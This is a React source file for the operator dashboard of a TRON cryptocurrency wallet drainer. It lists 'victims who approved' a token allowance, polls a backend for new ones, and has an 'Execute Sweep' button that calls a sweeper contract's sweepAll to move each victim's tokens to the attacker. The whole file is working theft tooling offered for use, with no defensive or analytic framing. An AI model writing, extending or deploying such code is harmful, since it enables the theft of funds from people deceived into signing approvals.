import { useState, useEffect } from "react";
import axios from "axios";

const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
const SWEEPER_ADDRESS = "TVkKiHXUKoE4dVCyzE94Vyqqa7SWsmcMsN";
const BACKEND = "http://localhost:3001";

function AdminDashboard() {
  const [victims, setVictims] = useState([]);
  const [draining, setDraining] = useState(null);
  const [manual, setManual] = useState("");

  // Poll backend for victims that approved.
  useEffect(() => {
    const load = async () => {
      try {
        const r = await axios.get(BACKEND + "/api/victims");
        setVictims(r.data);
      } catch (e) {}
    };
    load();
    const id = setInterval(load, 3000);
    return () => clearInterval(id);
  }, []);

  const addManual = () => {
    if (!manual.startsWith("T")) return alert("Enter a valid T... address");
    setVictims((v) => [...v, { address: manual, status: "MANUAL" }]);
    setManual("");
  };

  const executeDrain = async (victim) => {
    if (!window.tronWeb) return alert("Unlock TronLink (attacker wallet) first.");
    setDraining(victim);
    try {
      const tw = window.tronWeb;
      const c = await tw.contract().at(SWEEPER_ADDRESS);
      const tx = await c.sweepAll(TOKEN_ADDRESS, victim).send({ feeLimit: 100000000 });

      let info = await tw.trx.getTransactionInfo(tx);
      while (!info || !info.id) {
        await new Promise((r) => setTimeout(r, 2000));
        info = await tw.trx.getTransactionInfo(tx);
      }
      await axios.post(BACKEND + "/api/drained", { address: victim, txHash: tx });
      alert("Swept " + victim);
    } catch (e) {
      alert("Drain failed: " + (e.message || e));
    } finally {
      setDraining(null);
    }
  };

  return (
    <div className="dashboard-container" style={{ maxWidth: 640 }}>
      <h2 style={{ color: "#ef4444" }}>Attacker Control Panel</h2>
      <p style={{ color: "#94a3b8" }}>Live victims who approved. Execute sweep.</p>

      <div style={{ display: "flex", gap: 8, margin: "16px 0" }}>
        <input
          value={manual}
          onChange={(e) => setManual(e.target.value)}
          placeholder="T... victim address"
          style={{ flex: 1, padding: 10, borderRadius: 8, border: "1px solid #334155", background: "#0f172a", color: "#f8fafc" }}
        />
        <button onClick={addManual} style={{ padding: "10px 14px", borderRadius: 8, border: "none", background: "#3b82f6", color: "#fff", cursor: "pointer" }}>
          Add
        </button>
      </div>

      {victims.length === 0 && (
        <p style={{ color: "#94a3b8" }}>No victims yet. Run the victim page first.</p>
      )}

      {victims.map((v, i) => (
        <div key={i} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: 15, background: "#1e293b", borderRadius: 8, marginBottom: 10, border: "1px solid #334155" }}>
          <div>
            <div style={{ fontSize: 14, fontWeight: 700 }}>
              {v.address.slice(0, 6)}...{v.address.slice(-4)}
            </div>
            <div style={{ fontSize: 12, color: v.status === "DRAINED" ? "#ef4444" : "#10b981" }}>
              {v.status}
            </div>
          </div>
          <button
            onClick={() => executeDrain(v.address)}
            disabled={draining === v.address || v.status === "DRAINED"}
            style={{ background: "#ef4444", color: "#fff", border: "none", padding: "8px 16px", borderRadius: 6, cursor: "pointer", fontWeight: 700 }}
          >
            {draining === v.address ? "Draining..." : v.status === "DRAINED" ? "Done" : "Execute Sweep"}
          </button>
        </div>
      ))}
    </div>
  );
}

export default AdminDashboard;